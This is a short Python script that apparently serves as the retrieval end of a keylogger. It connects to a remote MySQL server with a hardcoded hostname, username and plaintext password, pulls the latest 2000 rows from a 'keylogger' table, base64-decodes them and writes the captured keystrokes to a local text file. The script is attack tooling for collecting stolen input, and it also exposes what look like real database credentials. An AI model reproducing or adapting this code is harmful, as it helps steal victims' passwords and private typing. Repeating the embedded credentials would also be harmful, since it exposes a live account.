import mysql.connector
import base64

mydb = mysql.connector.connect(
  host="srv1401.hstgr.io",
  port=3306,
  user="u361181648_root",
  password="Samhero97go@123",
  database="u361181648_wallibear",
force_ipv6=True,
    connection_timeout=10
)

mycursor = mydb.cursor()

mycursor.execute("SELECT encoded_text FROM keylogger ORDER BY id DESC LIMIT 2000")

myresult = mycursor.fetchall()

for host in myresult:
    for h in host:
      decoded_bytes = base64.b64decode(h)
      decoded_str = decoded_bytes.decode('utf-8')
      f = open("keylogger1.txt", "a")
      f.write(decoded_str + "\n")
      f.close()